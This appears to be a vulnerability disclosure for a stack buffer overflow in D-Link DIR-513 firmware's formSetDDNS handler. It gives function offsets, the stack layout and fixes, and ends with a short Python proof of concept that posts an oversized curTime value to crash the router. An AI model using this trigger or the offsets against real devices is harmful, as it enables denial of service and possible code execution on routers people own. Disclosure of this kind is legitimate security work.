### 1. Vulnerability Description

**Title:** Stack-based Buffer Overflow in D-Link DIR-513 `formSetDDNS` function **Description:** D-Link DIR-513 devices (A1 FW110, A2 FW110) contain a stack-based buffer overflow vulnerability in the `formSetDDNS` function of the web management interface (at offset `0x466fdc`). The vulnerability arises when the application processes the `curTime` parameter from an HTTP POST request. The program retrieves this user-controlled value via `websGetVar` and passes it to an unsafe `sprintf` call at address `0x467720` to format a string into a fixed-size 128-byte stack buffer (`v31`).

Due to the lack of boundary checks, an attacker can provide a specially crafted `curTime` value exceeding the buffer capacity to overwrite the return address on the stack (located 160 bytes away from the buffer start). This can lead to a Denial of Service (DoS) or arbitrary Remote Code Execution (RCE) with elevated privileges. Additionally, a secondary risk exists at address `0x4676e4`, where a `strcpy` operation can further propagate the overflow into the `err_msg` global buffer.

---

### 2. Product & Version Information

- **Vendor:** D-Link

- **Product:** DIR-513

- **Affected Versions:** A1 FW110, A2 FW110

- **Affected Component:** Web Server / `goform/formSetDDNS`

---

### 3. Vulnerability Details

- **Vulnerability Type:** CWE-121: Stack-based Buffer Overflow

- **Impact:** Remote Code Execution (RCE), Denial of Service (DoS)

- **Attack Vector:** Network (Remote/HTTP POST)

- **Authentication Required:** No (depending on specific device configuration for this endpoint)

- **CWE ID:** CWE-121

---

### 4. Technical Specifications & Exploitability

- **Vulnerable Function:** `formSetDDNS` (Address: `0x466fdc`)

- **Vulnerable Instruction:** `sprintf(v31, "/Tools/Dynamic_DNS.asp?t=%s", v28);` at `0x467720`

- **Stack Analysis:** * **Total Stack Frame:** 0x124 (292 bytes)
  
  - **Buffer `v31` Offset:** 0x80
  
  - **Return Address Offset:** 0x120
  
  - **Overflow Trigger Point:** 160 bytes from the start of `v31`

---

### 5. Suggested Mitigation

- **Primary Fix:** Replace `sprintf` with `snprintf` to enforce boundary limits: `snprintf(v31, sizeof(v31), "/Tools/Dynamic_DNS.asp?t=%s", v28);`

- **Input Validation:** Implement strict length validation for the `curTime` parameter before processing.

- **Binary Hardening:** Recompile the firmware with stack-smashing protection (`-fstack-protector`) and enable Address Space Layout Randomization (ASLR).

## 6.POC

```
import requests

# 目标URL
url = "http://192.168.0.1/goform/formSetDDNS"

# 构造超长payload触发溢出
payload = 'A' * 200  # 超过缓冲区大小的字符串

data = {
    'curTime': payload,  # 触发漏洞的参数
    'settingsChanged': '1',
    'config.dyndns_enabled': 'true',
    'config.dyndns_server': '1',
    'config.dyndns_user': 'testuser',
    'config.dyndns_pass': 'testpass',
    'config.dyndns_host': 'test.example.com'
}

# 发送触发请求
try:
    response = requests.post(url, data=data, timeout=5)
    print(f"Response Status: {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"Request failed (Possible crash): {e}")
```
